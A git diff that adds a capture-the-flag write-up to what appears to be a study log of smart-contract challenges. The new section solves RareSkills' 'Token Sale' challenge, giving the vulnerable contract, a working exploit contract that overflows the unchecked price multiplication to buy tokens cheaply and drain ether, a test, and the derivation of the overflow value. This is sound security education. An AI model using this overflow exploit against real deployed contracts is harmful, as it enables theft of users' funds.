@@ -1015,3 +1015,123 @@ contract SideEntranceTest is Test {
 The goal of the exploit is to drain all 1000 ETH from the lending pool. In the `SideEntranceLenderPool` contract, calling `flashLoan` calls the `execute` hook on the receiving contract. Because `deposit` does not have any restrictions on how/when it can be called, it can be used in the `execute` hook to fake a deposit by calling `deposit` with the flash loan amount to seemingly repay the loaned amount, and then `withdraw` can be called to transfer out the original requested loan amount without needing to pay it back.
 
 In the `exploit` function in the attacking contract, we call `flashLoan` with the balance of the lending pool as the loan amount. The `flashLoan` would then call the `execute` hook in our attacking contract with the balance of the lending pool as `msg.value`. In the `execute` hook, we call `deposit` and simply forward `msg.value` to the lending contract. This tricks the lending contract into thinking that we made a deposit into the lending pool, and we are able to bypass the `address(this).balance < balanceBefore` check at the end of the flash loan call because the balance returned to it original value in `balanceBefore`. By the end of `flashLoan`, the attacking contract would have the original flash loan amount recorded as its balance, and it can simply execute `withdraw` to transfer out the balance of the lending pool.
+
+## Capture the Ether Foundry (RareSkills): Token Sale
+Link: https://github.com/RareSkills/capture-the-ether-foundry/tree/master/TokenSale
+
+### Contracts
+- `src/Week8-9/`
+```
+contract TokenSale {
+    mapping(address => uint256) public balanceOf;
+    uint256 constant PRICE_PER_TOKEN = 1 ether;
+
+    constructor() payable {
+        require(msg.value == 1 ether, "Requires 1 ether to deploy contract");
+    }
+
+    function isComplete() public view returns (bool) {
+        return address(this).balance < 1 ether;
+    }
+
+    function buy(uint256 numTokens) public payable returns (uint256) {
+        uint256 total = 0;
+        unchecked {
+            total += numTokens * PRICE_PER_TOKEN;
+        }
+        require(msg.value == total);
+
+        balanceOf[msg.sender] += numTokens;
+        return (total);
+    }
+
+    function sell(uint256 numTokens) public {
+        require(balanceOf[msg.sender] >= numTokens);
+
+        balanceOf[msg.sender] -= numTokens;
+        (bool ok,) = msg.sender.call{value: (numTokens * PRICE_PER_TOKEN)}("");
+        require(ok, "Transfer to msg.sender failed");
+    }
+}
+
+// Write your exploit contract below
+contract ExploitContract {
+    TokenSale public tokenSale;
+
+    constructor(TokenSale _tokenSale) {
+        tokenSale = _tokenSale;
+    }
+
+    receive() external payable {}
+
+    function exploit() public {
+        uint256 numToCauseOverflow = (type(uint256).max / 10 ** 18) + 1;
+        uint256 payableAmount;
+        unchecked {
+            payableAmount = numToCauseOverflow * 10 ** 18;
+        }
+
+        tokenSale.buy{value: payableAmount}(numToCauseOverflow);
+        tokenSale.sell(1);
+    }
+}
+```
+- `src/Week8-9/`
+```
+contract TokenSaleTest is Test {
+    TokenSale public tokenSale;
+    ExploitContract public exploitContract;
+
+    function setUp() public {
+        // Deploy contracts
+        tokenSale = (new TokenSale){value: 1 ether}();
+        exploitContract = new ExploitContract(tokenSale);
+        vm.deal(address(exploitContract), 4 ether);
+    }
+
+    // Use the instance of tokenSale and exploitContract
+    function testIncrement() public {
+        // Put your solution here
+        exploitContract.exploit();
+        _checkSolved();
+    }
+
+    function _checkSolved() internal {
+        assertTrue(tokenSale.isComplete(), "Challenge Incomplete");
+    }
+
+    receive() external payable {}
+}
+```
+
+### Exploit
+To complete the exploit, we need to reduce the balance of `TokenSale` to be < 1 Ether. The contract starts with 1 Ether on deployment, and the exploit contract starts with 4 Ether. The cost of tokens calculated by the contract is simply `numTokens * 1 ether` (for both buying and selling), so its not possible to exploit `TokenSale` by spamming `buy` and `sell`. To exploit the contract, we have to be able to obtain tokens at a lower price, so that we can sell tokens back and reduce the balance of `TokenSale` to be below 1 Ether.
+
+Since the `buy` function contains an unchecked block: `total += numTokens * PRICE_PER_TOKEN`, we can capitalize on this to make `numTokens` large enough so that when multiplied by `10 ** 18` it exceeds `type(uint256).max` and overflows such that `total` becomes smaller than expected.
+
+The exploit contract only has 4 ether, so we cannot pass in uint256 max as `numTokens` as it would result in a very large number for `total`. The value of `numToken` should also be within the range of uint256.
+
+The max value for `uint256` is `2**256 - 1`, which is: `115792089237316195423570985008687907853269984665640564039457584007913129639935`. This means that `2 ** 256` will technically overflow and return `0`. We want a number that when multiplied by `10**18` causes an overflow, and we cannot calculate the number to cause an overflow by simply taking `2**256 / 10**18`, because this would not return an integer type.
+```
+//You would get this error:
+Type rational_const 4417...(64 digits omitted)...4944 / 3814697265625 is not implicitly convertible to expected type uint256. Try converting to type ufixed256x17 or use an explicit conversion.
+
+(With WolframAlpha)
+2**256 / 10**18 == 441711766194596082395824375185729628956870974218904739530401550323154944 / 3814697265625
+```
+
+Since the overflow is caused by a multiplication of `10**18`, we can divide uint256 max by `10**18` and reduce it by 18 digits to yield: `115792089237316195423570985008687907853269984665640564039457`. Then we can simply `+ 1` to get the smallest number that will cause the overflow after the multiplication.
+```
+115792089237316195423570985008687907853269984665640564039457 + 1 = 115792089237316195423570985008687907853269984665640564039458
+```
+
+This number will overflow to 415992086870360064 when it is multiplied by `10 ** 18`, which is only ~ 0.41599 Ether.
+```
+(WolframAlpha)
+
+115792089237316195423570985008687907853269984665640564039458 * 10 ** 18 = 115792089237316195423570985008687907853269984665640564039458000000000000000000
+
+115792089237316195423570985008687907853269984665640564039458000000000000000000 - 115792089237316195423570985008687907853269984665640564039457584007913129639935 = 415992086870360065
+```
+
+Thus if the exploit contract calls `buy` and passes `115792089237316195423570985008687907853269984665640564039458` as `numTokens`, this would only cost ~ 0.41599 Ether to get that amount of tokens. The `TokenSale` contract's balance will only be about 1.41599 Ether; and when the exploit contract calls `sell` and passes in `1`, the `TokenSale` contract will transfer 1 Ether to the exploit contract and its balance will be reduced to 0.41599 Ether, thereby fufilling the exploit challenge (balance < 1 Ether).
